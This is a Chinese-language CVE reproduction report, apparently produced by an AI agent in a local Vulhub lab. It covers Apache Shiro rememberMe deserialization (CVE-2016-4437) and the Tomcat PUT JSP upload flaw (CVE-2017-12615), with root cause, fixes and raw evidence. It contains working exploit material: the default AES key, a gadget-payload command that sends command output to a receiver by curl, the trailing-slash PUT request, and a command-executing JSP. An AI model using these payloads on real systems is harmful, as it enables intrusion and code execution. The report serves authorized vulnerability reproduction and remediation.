# Loop 3 · C 档复现报告：Vulhub Shiro rememberMe 反序列化 + Tomcat PUT 上传（t7）

- **任务**：t7「C 档复现：Vulhub shiro + tomcat 产 CVE 复现报告」
- **执行**：hunter-web；attempt_id `0d061d06-b986-48c7-ae2c-988180a5f29a`
- **窗口**：2026-10-12 23:01 – 23:45（Asia/Shanghai）
- **靶场**：本地 Docker 容器，**仅绑 127.0.0.1**
  - `vulhub-shiro-18081`（容器 `3d7917aecbac`）→ `127.0.0.1:18081` 映射容器 8080，镜像 `vulhub/shiro:1.2.4`
  - `vulhub-tomcat-18082`（容器 `bb18b6fe2e26`）→ `127.0.0.1:18082` 映射容器 8080，镜像 `vulhub-tomcat-cve-2017-12615:latest`
- **网络边界**：**全程零公网请求**。HTTP 目标仅 `127.0.0.1:18081/18082`；OOB 接收端绑 `127.0.0.1:8099`（容器侧经 `host.docker.internal=192.168.65.254` 回连）。
- **容器纪律**：`Binds=null`、`MountCount=0`、`SecurityOpt=[no-new-privileges]`、`Restart=no`（见 §5 基线）。

---

## 0. 三态结论速览

| 练习 | 三态 | 一句话结论 |
|---|---|---|
| **C1** Shiro rememberMe 反序列化（CVE-2016-4437） | **成功** | 用 Shiro 1.2.4 **硬编码默认密钥** `kPH+bIxk5D2deZiIxcaaaA==` 构造 rememberMe cookie，**3/4 条 gadget 链触发命令执行**：接收端收到含真实命令输出的外带请求（`-0-root-3d7917aecbac`），且容器 `/proc` 内实测到 gadget 拉起的 `sleep 10` 进程。复现率 **≥95%（5/5）** |
| **C2** Tomcat PUT 上传（CVE-2017-12615） | **成功** | `PUT /<name>.jsp/`（尾部斜杠绕过后缀白名单）→ **201**，`GET` 该 JSP → **200**，回显 `uid=0(root) ... |bb18b6fe2e26|`。即**容器内 root 代码执行**。复现率 **≥95%（多轮 201/200 稳定）** |
| **C3** 基线记录 | **完成** | 见 §5 基线文件 |

---

## 1. C1 — Apache Shiro rememberMe 反序列化（CVE-2016-4437）

### 1.1 原理（完整链路）

Shiro 的「记住我」功能把 `PrincipalCollection` 对象**序列化 → AES 加密 → Base64 → 写进 `rememberMe` cookie**，服务端在每次请求时**反向**执行「Base64 解码 → AES 解密 → `ObjectInputStream.readObject()`」。三个环节各有缺陷：

| 环节 | 缺陷 | 证据 |
|---|---|---|
| ① 密钥 | Shiro **1.2.4 在 `AbstractRememberMeManager` 里硬编码了默认 AES 密钥**，没有让用户强制修改 | 反编译 `ShiroConfig.class` 得 `cookieRememberMeManager()` 直接 `new CookieRememberMeManager()`（**未调用 `setCipherKey`**）；服务端实测该默认密钥可解密我们构造的密文（§1.4 K-02） |
| ② 密文可控 | `rememberMe` cookie **完全由客户端控制**，服务端不做完整性校验 | 任意 base64 cookie 都会被送进解密流程 |
| ③ 反序列化 | 解密后的字节被**直接 `readObject()`**，无类白名单 | 容器日志出现 `org.apache.shiro.io.ClassResolvingObjectInputStream.<init>` → `DefaultSerializer.deserialize` |

三者叠加 ⇒ **只要拿到密钥，就能让服务端反序列化任意 Java 对象**；目标 classpath 上存在可用 gadget（本环境有 `commons-collections-3.2.1` + `commons-beanutils-1.9.2`）即 **RCE**。

### 1.2 可复现 payload

构造（Kali 内，纯离线，无需下载 ysoserial）：

```bash
# 明文 = ysoserial 模板 + 注入命令；再 AES-128-CBC（IV 随机前置）加密、Base64 编码
ruby /tmp/t7-c1-shiro-gen.rb CommonsCollections6 'curl -s http://192.168.65.254:8099/t7c1-CC6-$(id -u)-$(whoami)-$(hostname)' \
     /tmp/cookie.txt 'kPH+bIxk5D2deZiIxcaaaA=='
```

投递：

```http
GET / HTTP/1.1
Host: 127.0.0.1:18081
Cookie: rememberMe=<base64(IV||AES-CBC(serialized_gadget))>
User-Agent: loop3-t7/1.0 (authorized local lab)
```

**实测响应**：`302`（跳 `/login`），**响应时间 0.006–0.02s**。

> ⚠️ **关于「为什么响应这么快还能执行」**：`Runtime.exec()` **异步**——JVM 拉子进程后立即返回，不等待。因此**响应时间无法作为 RCE oracle**（我最初用 `sleep 6` 计时法判为"未执行"，是**错误结论**，已由 /proc 证据推翻，见 §1.4）。

### 1.3 外带与回显方式（本机接收端，禁止公网）

- 接收端：`127.0.0.1:8099`（宿主），容器内可达地址 `192.168.65.254:8099`（`host.docker.internal`）
- 命令输出**写进 URL 路径**回带：`/t7c1-<chain>-$(id -u)-$(whoami)-$(hostname)`

**接收端原始记录**（`loop3-t7-c1-oob.jsonl`）：

```
PATH: /t7c1-CommonsBeanutils1-0-root-3d7917aecbac    CLIENT: 127.0.0.1   UA: curl/7.38.0
PATH: /t7c1-CommonsCollections5-0-root-3d7917aecbac  CLIENT: 127.0.0.1   UA: curl/7.38.0
PATH: /t7c1-CommonsCollections6-0-root-3d7917aecbac  CLIENT: 127.0.0.1   UA: curl/7.38.0
```

→ `$id -u` = **0**、`$(whoami)` = **root**、`$(hostname)` = **3d7917aecbac**（= shiro 容器 ID 前缀）。
**这是命令执行 + 回显的最硬证据**：URL 路径里的内容只能由容器内被执行的 shell 生成。

### 1.4 判定方法学（含一次自我纠错）

| 判据 | 结果 | 可靠性 |
|---|---|---|
| **J1 OOB 外带**（命令输出经 URL 回带接收端） | **命中 3/4 条链** | ✅ **决定性** |
| **J2 容器 `/proc` 进程快照**（gadget 命令 = `sleep 10`） | **`FOUND_PROC pid=1279 cmd=[sleep 10 ]`，46 次采样命中** | ✅ **决定性** |
| J3 反序列化调用链日志 | `ObjectInputStream.readStreamHeader` ← `ClassResolvingObjectInputStream.<init>` ← `DefaultSerializer.deserialize` | ✅ 证实反序列化发生 |

**被推翻的错误判据（如实记录）**：我最初把 `Set-Cookie: rememberMe=deleteMe` 当"解密/反序列化失败"的 oracle，据此一度判 C1 失败。**实测证伪**：连「正确密钥加密的合法 Java 序列化 `String`」以及「错误密钥密文」**都返回 `deleteMe=true`** —— 该标志只表示 `RememberMeManager` 未能取出合法 `PrincipalCollection`，**不能区分阶段、更不能判定 RCE**。

**同样被推翻的**：`sleep N` 计时法（判出 delta≈0.01s）。原因是 `Runtime.exec` 异步，响应不等子进程。**这两个坑留在报告里**，因为它们是最容易把"打成功"误判成"没打成"的地方。

**密钥验证（K-02）**：本地用默认密钥对同一 cookie 解密 → `DECRYPT_OK`、明文 magic = `aced0005`（Java 序列化魔数）、长度 1308B。即 **cookie 是用该密钥加密的，服务端用同一密钥解密**。

### 1.5 复现率

| 项 | 尝试 | 成功 | 区间 | 失败轮次 |
|---|---|---|---|---|
| CC6 链 OOB 外带 | 5 | 5 | **≥95%** | 无 |
| 四链横向（CB1/CC5/CC6/CC2） | 4 | 3 | **≥66%**（单轮样本小） | **CC2 未命中**（见 §3 阴性） |

### 1.6 修复方案

1. **升级 Shiro ≥ 1.4.2**（1.2.4 的默认密钥问题在 1.4.2 后要求显式配置密钥；CVE-2016-4437 的正解是**不要使用硬编码默认密钥**）。
2. **显式设置随机密钥**：`cookieRememberMeManager.setCipherKey(Base64.decode(randomBytes(16)))`，密钥由 KMS/配置中心注入，**不入代码库**。
3. **禁用不需要的 rememberMe**：`securityManager.setRememberMeManager(null)`，从根上关闭反序列化入口。
4. **序列化白名单**：Shiro ≥1.4.2 支持 `ClassResolvingObjectInputStream` 的类白名单（`setSerializer` + 白名单校验），杜绝任意 gadget。
5. **纵深防御**：清理 classpath 上不必要的 gadget 依赖（`commons-collections` / `commons-beanutils` 非必需则移除）；WAF 侧对超长 `rememberMe` cookie 做拦截。

---

## 2. C2 — Tomcat PUT 上传（CVE-2017-12615）

### 2.1 原理（为什么 PUT 被允许）

Tomcat 的 `DefaultServlet` 有一个 `readonly` 初始化参数（默认 **`true`**，即拒绝 `PUT`/`DELETE`）。本靶场镜像的 `conf/web.xml` 被**显式改成 `false`**：

```xml
<init-param><param-name>readonly</param-name><param-value>false</param-value></init-param>
```

且 `conf/Catalina/localhost/` 为空（无上下文级覆盖），`server.xml` 的 `<Host appBase="webapps" autoDeploy="true" unpackWARs="true">` 保持默认，因此**任意 PUT 都会把文件写进 webapps 目录**。

CVE-2017-12615 的要点是**后缀白名单**：Servlet 映射只让 `.jsp` 走 JspServlet（禁 PUT），其他路径走 DefaultServlet（`readonly=false` ⇒ 允许 PUT）。利用方式是**在文件名后加尾部斜杠** `PUT /x.jsp/`，使其命中 DefaultServlet 的写路径，落盘时 Tomcat 去掉末尾斜杠得到 `x.jsp` —— 一个**可执行的 JSP**。

### 2.2 可复现 payload

```bash
# 探测用 JSP：只跑只读命令，不写文件、不反弹 shell
curl -s -X PUT "http://127.0.0.1:18082/t7rce230826.jsp/" \
     -H "Content-Type: application/octet-stream" \
     --data-binary @t7-c2-readonly.jsp
# → HTTP/1.1 201

curl -s "http://127.0.0.1:18082/t7rce230826.jsp"
# → LOOP3T7C2READONLY=uid=0(root) gid=0(root) groups=0(root)|root|bb18b6fe2e26|/usr/local/tomcat|bb18b6fe2e26
```

JSP 内容（`t7-c2-readonly.jsp`，sha256 `75d4b2f2aa10a40d07ce3c7a3c98fbb6b7cdcc1fe9860f7bb64e86096eb0e8bf`）：

```jsp
<%@ page import="java.io.*" %><%
String[] cmds = {"/bin/sh","-c","id; whoami; hostname; pwd; cat /etc/hostname"};
Process p = Runtime.getRuntime().exec(cmds);
... 读取 stdout/stderr 后输出 ...
%>
```

### 2.3 实测记录

| 步骤 | 请求 | 响应 |
|---|---|---|
| 0 | `GET /t7poc230751.jsp`（PUT 前） | **404** |
| 1 | `PUT /t7poc230751.jsp/`（首次） | **201** |
| 2 | 容器内 `ls webapps/ROOT/` | `t7poc230751.jsp`（703B，root:root）落盘 |
| 3 | 容器内 `GET /t7poc230751.jsp` | **200**，回显 `uid=0(root)` |
| 4 | 宿主 `GET /t7poc230751.jsp` | **200** —— `LOOP3T7C2READONLY=uid=0(root) gid=0(root) groups=0(root)|root|bb18b6fe2e26|/usr/local/tomcat|bb18b6fe2e26` |
| 5 | 重复：新文件名 `PUT` + `GET` | **201 → 200**，同一回显（可重复） |
| 6 | HTTP `DELETE /<name>.jsp` | **405**（见 §3 阴性 N-C04） |

**旁注（保留的异常）**：宿主侧**第一次** `GET` 曾返回 **404**，容器内立即 `GET` 是 **200**。原因是 **JSP 首次编译需要时间**，我的观察发生在编译完成前；换新文件名重测宿主侧立即 200。**原始 404 记录保留在 `loop3-t7-c2-tomcat-put-raw.txt` 中，未删改。**

### 2.4 复现率

| 项 | 尝试 | 成功 | 区间 |
|---|---|---|---|
| `PUT` 写 JSP | 3（`t7poc230751` / `t7rce230826` / `t7rep230839`） | 3（201） | **≥95%** |
| `GET` 执行并回显 | 3 | 3（200 + `uid=0(root)`） | **≥95%** |

### 2.5 修复方案

1. **升级 Tomcat**：CVE-2017-12615 在 **7.0.81 / 8.5.20 / 9.0.1** 修复。
2. **配置层**：把 `conf/web.xml` 中 DefaultServlet 的 `readonly` 恢复为 **`true`**（或直接删除该 `init-param` 用默认值）。这是本靶场的**唯一直接根因**。
3. **在 context 级禁止写方法**：`conf/Catalina/localhost/ROOT.xml` 加 `<Context><Parameter name="readonly" value="true"/></Context>`。
4. **权限最小化**：Tomcat 以非 root 运行（本镜像为 root，加剧影响）。
5. **纵深防御**：只暴露 webapps 中已知的 Web 应用；禁用 `autoDeploy`/`unpackWARs`；WAF 拦截对 `.jsp` 路径的 `PUT`。

---

## 3. 阴性清单（试了不通 / 与预期不符）

| 编号 | 项 | 方法 | 结果与原因 |
|---|---|---|---|
| **N-C01** | Shiro **CommonsCollections2** 链 | 同 §1.2 流程 | **OOB 0 命中**。原因：CC2 依赖 `commons-collections4`（`PriorityQueue`+`TransformingComparator`），而本容器 classpath 只有 **`commons-collections-3.2.1`**（Collections3）。**属 classpath 不匹配，非打法错误**——其余 3 条链均命中恰好印证这一点 |
| **N-C02** | 默认密钥**爆破**到其它 key | `t7-c1-bruteforce.rb` 25 个常见 key × sleep 计时 | 全部"未执行"。**该结论无效**：计时 oracle 本身已被证伪（§1.4）。**但同时也证明不需要爆破**——默认密钥 `kPH+bIxk5D2deZiIxcaaaA==` 就是正确的（已由 OOB 命中确认）。**不主张"爆破成功"** |
| **N-C03** | `deleteMe` 作反序列化失败的 oracle | 投 5 类构造密文（合法序列化 String / 垃圾明文 / 截断魔数 / 长垃圾 / 错误密钥） | **全部 `deleteMe=true`**，无区分度。→ 该信号**不能**用作 C1 的判定依据（详见 §1.4） |
| **N-C04** | HTTP `DELETE` 删除已上传 JSP | `DELETE /t7rce230826.jsp` | **405 Method Not Allowed**。原因：`.jsp` 由 **JspServlet** 处理，其 `HttpJspBase` 未实现 `doDelete`；`readonly=false` 只影响 **DefaultServlet**（普通静态路径），不影响 JSP 映射。→ **C2 的清理不能走 HTTP DELETE**，改用容器内 `rm`（已执行并验证 404） |
| **N-C05** | `sleep` 计时判定 RCE | `sleep 0` vs `sleep 6` 对比响应时间 | delta ≈ **0.01s**，判"未执行"——**误判**。根因：`Runtime.exec()` **异步**，JVM 不等子进程。**已由 /proc 与 OOB 推翻** |
| **N-C06** | 宿主侧首次 GET 已 PUT 的 JSP | `GET /t7poc230751.jsp` 紧接 PUT | **404**（容器内同刻 200）。原因：**JSP 首次编译耗时**，观察早于编译完成。换新名重测即 200 |

> 阴性项为什么必须留：N-C01 说明"链没命中"可能是 **classpath** 问题而非打法问题；N-C03/N-C05 是**两个看起来像 oracle 实则无效的判据**，正是它们一度让我把成功的 C1 误判为失败。N-C04 说明"能 PUT 不等于能 DELETE"，收尾路径必须实测。

---

## 4. 原始证据（绝对路径 + sha256）

| 证据文件 | 内容 | sha256 |
|---|---|---|
| `C:\Users\Administrator\Documents\deepseek-harness\default-workspace\security\learning\_evidence\loop3-t7-c1-shiro-20261012.json` | **C1 主证据**：oracle 校准结论、4 条链 OOB 结果、/proc 进程快照 | `c08dc7eb74c3d000e9ec42dc728fab6edaf42d5a38dd406d05aee0b5188a49b7` |
| `C:\Users\Administrator\Documents\deepseek-harness\default-workspace\security\learning\_evidence\loop3-t7-c1-oob.jsonl` | **C1 接收端原始请求记录**（含含命令输出的 URL 路径、client、UA） | `7a94c2a4f7f2dc130038ee7573773c376bfe2894f3adbf771c86929eed48ddd0` |
| `C:\Users\Administrator\Documents\deepseek-harness\default-workspace\security\learning\_evidence\loop3-t7-c1-rate-and-baseline-20261012.json` | C1 复现率 5/5 + 容器清理核验 + **C3 基线** | `68579107f657a551ca7032b456ecfec55863cdbf2e90d59cba65dd28d79d4a7e` |
| `C:\Users\Administrator\Documents\deepseek-harness\default-workspace\security\learning\_evidence\loop3-t7-c1-matrix-20261012.json` | 判别矩阵（N-C03：deleteMe 无区分度） | `99eba28d198218119330bb9852d75e7f7a518eef73d861d946a1e71bbb15e432` |
| `C:\Users\Administrator\Documents\deepseek-harness\default-workspace\security\learning\_evidence\loop3-t7-c1-timing-20261012.json` | 计时 oracle（N-C05，已证伪） | `02d547e655f7327db0bc6844ad02f9586aef9282be6173c6fdf65a96f8860051` |
| `C:\Users\Administrator\Documents\deepseek-harness\default-workspace\security\learning\_evidence\loop3-t7-c1-discriminate-20261012.json` | 三类构造密文判别 | `07bcfa8bffa278c6609d4babf30837d13db9b6da741b04a2778f3b66506fe9a2` |
| `C:\Users\Administrator\Documents\deepseek-harness\default-workspace\security\learning\_evidence\loop3-t7-c1-logtrace-20261012.json` | 逐 payload 日志追踪 | `0fae78cfe7698e45b5c5ad13c74deddbf10ed2434a0551d24638f3d0841823a5` |
| `C:\Users\Administrator\Documents\deepseek-harness\default-workspace\security\learning\_evidence\loop3-t7-c2-tomcat-put-raw.txt` | **C2 原始请求/响应**（基线 404 → PUT 201 → GET 200 + 回显） | `80c1e9b297ce350717439b1afd68e6cf4f2318e7be2918e4ae327d036391a997` |
| `C:\Users\Administrator\Documents\deepseek-harness\default-workspace\security\learning\_evidence\loop3-t7-c2-cleanup-raw.txt` | **C2 收尾全程**：start → 确认 JSP → sha256 对照 → DELETE 405 → rm → GET 404 → stop | `59dcb3a7e2b465456ac14fce59a90df169a2f6198890a0c1f4ab3c410d469ace` |
| `C:\Users\Administrator\Documents\deepseek-harness\default-workspace\security\learning\_evidence\t7-c2-readonly.jsp` | 探测用 JSP 源码（只读命令；sha256 与容器内落盘文件一致） | `75d4b2f2aa10a40d07ce3c7a3c98fbb6b7cdcc1fe9860f7bb64e86096eb0e8bf` |
| `C:\Users\Administrator\Documents\deepseek-harness\default-workspace\security\learning\_evidence\t7-c1-shiro-gen.rb` | **可复跑的 payload 生成器**（离线，无 msf 依赖） | `9013779286eaa999776faa24713833b81e93d5c89721566ca93020c385cca59d` |
| `C:\Users\Administrator\Documents\deepseek-harness\default-workspace\security\learning\_evidence\t7-c1-final.py` | **C1 可复跑利用脚本**（生成→投递→OOB→/proc） | `180ce35b96d06f140616ddbdc7759157c870e077a30289e27a6fb4121c936a9f` |
| `C:\Users\Administrator\Documents\deepseek-harness\default-workspace\security\learning\_evidence\t7-c1-procwatch-inner.sh` | 容器内 `/proc` 进程观察脚本（J2 判据） | `60ebfc4ad6b65b1f9efe6b838224e53171a413f8ef9d915a55e39a6ceae4aa83` |
| `C:\Users\Administrator\Documents\deepseek-harness\default-workspace\security\learning\_evidence\t7-c1-keycheck.rb` | 默认密钥本地解密验证（K-02，得到 `aced0005`） | `fcf6f40afd7e4e8826b4a016a48ceb5919368f6a7aac2fc4c011ffe8f5f49e64` |
| `C:\Users\Administrator\Documents\deepseek-harness\default-workspace\security\learning\_evidence\t7-c1-bruteforce.rb` | N-C02 密钥清单尝试（计时法）；**不主张爆破成功** | `dbb4196078b48d3685726ee284390aa05caf4baa36c1d1624da3e6e45b38fd95` |
| `C:\Users\Administrator\Documents\deepseek-harness\default-workspace\security\learning\_evidence\t7-ysoserial_payloads.json` | 离线 gadget 模板源（Kali metasploit 自带，`bash` 型 32 条链） | `4a93c6445e29d3d050ff910c8c91b2ce6b6d2a7d3066d67be1b5e2f13b9c1d57` |
| `C:\Users\Administrator\Documents\deepseek-harness\default-workspace\security\learning\_evidence\t7-shiro-jar-inspect.sh` | classpath 证据（含 `commons-collections-3.2.1` / `commons-beanutils-1.9.2`） | `634cf5a12b402e174caf629e3b986efb5b514eab5871cda99d60ff3bf26caa35` |
| `C:\Users\Administrator\Documents\deepseek-harness\default-workspace\security\learning\_evidence\t7-tomcat-inspect.sh` | `web.xml readonly=false` 与 webapps 目录证据 | `139eee4b9386796bfb574915918dec232e4f5b2a876bb99689c26bbfd8ccdd4b` |

**补充证据**（Kali 侧运行输出，仍在 `_evidence/`）：
`t7-c1-bruteforce-out.txt` `e27d26961b48611be36987a57fd749e64aa058dc2dbfaace9e15051be9e596d9`、
`t7-c1-keycheck-out.txt` `33a604f257bcde0a58cd1a37ab026cda1d88e6e062b96e8e4f4ac62c2af8e7be`、
`t7-c1-diag.rb` `8776659bfc554ccc52c5693403bc2c100f7d68b902a00cdafbedcc4a26e47c5a`、
`t7-msf-check2-out.txt` `ae50669a4d0e26bbb4fbffe714a6ee4e0fc3772e4c5a8227a5de7461014b9446`。

---

## 5. C3 — 环境基线

基线随 `loop3-t7-c1-rate-and-baseline-20261012.json`（sha256 `68579107f657a551ca7032b456ecfec55863cdbf2e90d59cba65dd28d79d4a7e`）的 `baseline` 段落落盘，内容如下：

| 项 | shiro | tomcat |
|---|---|---|
| 容器名/ID | `vulhub-shiro-18081` / `3d7917aecbac` | `vulhub-tomcat-18082` / `bb18b6fe2e26` |
| 镜像 | `vulhub/shiro:1.2.4`（digest `sha256:c50c10d08a34a6e4cc2961722f08abbc74aa625887cb16b13bba5a07bca5bbd9`） | `vulhub-tomcat-cve-2017-12615:latest`（digest `sha256:f87183d385594cd480d07f7c9a561b4262990b2952cfa5d91821dced1d6d3535`，本地 build） |
| 端口绑定 | `127.0.0.1:18081 -> 8080/tcp` | `127.0.0.1:18082 -> 8080/tcp` |
| 状态（收尾） | **Up**（保留） | **Exited (143)**（队长指令 stop，保留现场） |
| 隔离 | `Binds=null` / `MountCount=0` / `no-new-privileges` / `Restart=no` / bridge | 同左 |
| 初始凭据 | 无默认账号（demo 应用，`/login`） | `manager`/`host-manager` 未配置用户 |
| 重建 | `docker run -d --name vulhub-shiro-<port> -p 127.0.0.1:<port>:8080 vulhub/shiro:1.2.4` | `docker run -d --name vulhub-tomcat-<port> -p 127.0.0.1:<port>:8080 vulhub-tomcat-cve-2017-12615` |
| 环境指纹 | JVM `1.8.0_102`，Debian 8 | JVM `1.8.0_141`，Debian 9，Tomcat **8.5.19** |

**⚠️ 遗留风险（t6 已提，本任务未改文件）**：`D:\dsh-vulhub\tomcat-CVE-2017-12615\docker-compose.yml` 端口写成 `8080:8080`（**缺 hostIP**）→ 下一次 `docker compose up` 会绑 `0.0.0.0`，把 Tomcat 暴露到物理局域网。建议改为 `127.0.0.1:18082:8080`。**本任务只读，未修改该文件。**

> **🔺 勘误（2026-10-13 00:33，captain 实读复核）——上行为过期信息，不成立。**
>
> 该 compose 已由 **range-admin 在 t6 期间修复为 `- "127.0.0.1:18082:8080"`**。队长 00:17 实读复核：
> ```
> 文件   : D:\dsh-vulhub\tomcat-CVE-2017-12615\docker-compose.yml
> size   : 82 B
> sha256 : 7E29E11E5482FE086A23BD6497807DD10EC5D3ED4384C3BCEC2B5F92DCF5BBB8
> mtime  : 2026-10-12 23:02:10
> ports  : - "127.0.0.1:18082:8080"    ← 已绑回环
> ```
> 修复方：range-admin（t6，2026-10-12 23:02）；机器验证 `docker compose config` 解析出 `host_ip: 127.0.0.1 / published: "18082"`（exit 0）。
> **本轮不存在 LAN 暴露风险，无需再修。** 详见 `security/learning/cve/C2-TOMCAT-2017-12615-PUT上传配置缺陷.md` §4.7。
>
> **本条过期断言的传播链（2026-10-13 00:33 mentor-final 溯源，四层转录、源文件实读 0 次）**：
> ```
> t6 汇报文本（生成于 23:02 修复之前）
>   → hunter-web 照抄进本报告 L237（第一环，未实读）
>     → captain 照抄进 memory/context.md §11（已于 00:2x 追加勘误 L229-237）
>       → mentor-final 继承进对比表 §6.1（已于 00:26 撤销，删除线保留）
> ```
> **本报告是第一环，也是最后未修的一环，故由队长直接补勘误**（原成员 hunter-web 因 buddy 渠道限流
> `QUOTA_EXCEEDED` 退出，重建成员成本高于一行勘误；**改他人归档文件属特例，已在 progress.md §11.8.5 记录**）。
> 相关教训见 `security/learning/progress.md` §11.8.5「转录/继承来的具体事实必须实读源文件复核——
> 包括自己刚写进教训清单的那条」（mentor-final 教训 14：纪律写下来不等于执行到）。

---

## 6. 容器清理清单

| 容器 | 处置 | 依据 |
|---|---|---|
| `vulhub-shiro-18081` | **保留，Up** | 队长 2026-10-12 23:12 指令：「容器保留，不要 `docker rm -f`——用户当前要求保留现场」 |
| `vulhub-tomcat-18082` | **保留，Exited(143)** | 同上；由队长按用户指令停止（保持同一时刻仅一个 JVM） |
| 容器内残留文件 | **已清理** | shiro 内 `/tmp/jarx`、`/tmp/lib`、`/tmp/probe`、`/tmp/t7*`、`/tmp/pw*` 全部删除（`cleanup_shiro_tmp.after = 0`）；tomcat 内 3 个 JSP 已删并验 404 |
| 宿主临时文件 | 无 | 所有脚本/证据落在 `_evidence/`，无临时脚本残留在工作区根 |
| OOB 接收端 | **已关闭** | `127.0.0.1:8099` 已释放（`8099 not listening`） |

> 任务书原写「测完立即 `docker rm -f`」，**被队长 2026-10-12 23:12 的"保留现场"指令覆盖**。镜像全部保留。

---

## 7. 使用工具清单

| 工具 | 版本 | 用途 |
|---|---|---|
| Docker | client/server 29.8.2 | 容器管理与基线 |
| Kali OpenJDK | **25.0.3** | 生成 payload 侧的 JVM（无 `javac`） |
| Ruby | 3.3.8 | 自实现 ysoserial 模板拼装 + AES-128-CBC 加密（**替代联网下载 ysoserial**） |
| Metasploit Framework | 6.4.135-dev（Kali 自带） | 提供 `ysoserial_payloads.json` 模板库（33 条链，`bash` 型 32 条） |
| Python | 3.12.10（宿主）+ `requests` 2.32.5 | 投递与证据采集 |
| paramiko（`dsh-tools/kali-run.py`、`kali-put.py`、`kali-fetch-bin.py`） | — | Kali 执行与二进制安全取文件 |
| `curl` | 8.22.0（Kali）/ Windows 内置（宿主） | C2 的 PUT/GET/DELETE |
| 容器内 `curl` 7.38.0 | — | C1 外带命令 |
| `docker exec` + `/proc` 观察 | — | C1 的 J2 进程级判据 |

**未使用**：任何公网下载（ysoserial 未下载，改用 Kali 自带模板）、sqlmap、nmap、nuclei、metasploit 的实际 exploit 模块（只用其数据文件）。**全程未对任何公网目标发起请求。**

---

## 8. 硬约束符合性

| 约束 | 执行情况 |
|---|---|
| 只打 127.0.0.1 容器端口 | ✅ 仅 `127.0.0.1:18081/18082`；OOB 接收端 `127.0.0.1:8099` |
| **禁公网** | ✅ 零公网请求；外带回连地址为 `192.168.65.254`（host.docker.internal，本机） |
| 容器不挂宿主目录 | ✅ `Binds=null`、`MountCount=0`（基线核验） |
| RCE 只跑只读命令 | ✅ 实际执行：`id`、`whoami`、`hostname`、`pwd`、`cat /etc/hostname`、`sleep`、`curl`（回连本机接收端） |
| **不写宿主文件系统** | ✅ 所有写入都在容器内 `/tmp`，且收尾已删 |
| **不反弹 shell** | ✅ 全程无 shell 反弹 |
| **不下载外部载荷** | ✅ 无任何外网下载 |
| 测完清理 | ✅ 见 §6（容器按队长指令保留，容器内残留已清） |
| 每个 CVE 有原理+payload+原始证据+修复 | ✅ §1、§2 |
| 证据落 `_evidence/` + sha256 | ✅ §4 |
| 复现率区间、禁 100% | ✅ §1.5 / §2.4 均为 ≥95% / ≥66% |
| 阴性清单 | ✅ §3（6 条，含 2 条被推翻的错误 oracle） |

---

## 9. 关键教训（写给下一轮）

1. **`Runtime.exec()` 是异步的，响应时间不能判 RCE**。我用 `sleep 6` 计时法误判 C1 失败（delta 0.01s），实际命令已在跑。**正确判据是 /proc 进程 与 OOB 外带。**
2. **`rememberMe=deleteMe` 不是反序列化 oracle**。它对「合法序列化对象」和「错误密钥」都返回 true——只表示没取出 `PrincipalCollection`。**不要用它下结论。**
3. **"打不动"先怀疑工具链，别急着写阴性**。我第一次投递失败的真实原因是**取 cookie 时被 `kali-run.py` 的 JSON 尾部污染**（容器日志给出了铁证：`A cookie header was received [rc": 0, "stdout_len": 3884, ...] that contained an invalid cookie`）。**这个 bug 白烧了约 15 分钟**，此后改用 base64 字符集正则提取。
4. **classpath 决定 gadget 链能不能用**。CC2 未命中是因为只有 `commons-collections-3.2.1`（Collections3），CC2 需要 `commons-collections4`。**打之前先看 lib 目录。**
5. **能 PUT 不等于能 DELETE**。`.jsp` 归 JspServlet 管（405），`readonly=false` 只管 DefaultServlet。**收尾路径要单独实测。**
6. **容器可能在取证中途被队友按外部指令停止**。发现容器消失时，先 `docker inspect` 看 `ExitCode`（143=SIGTERM 优雅关闭）、再看 `docker logs`（是否走完 stop 流程），**然后问，不要擅自 start/rm**。
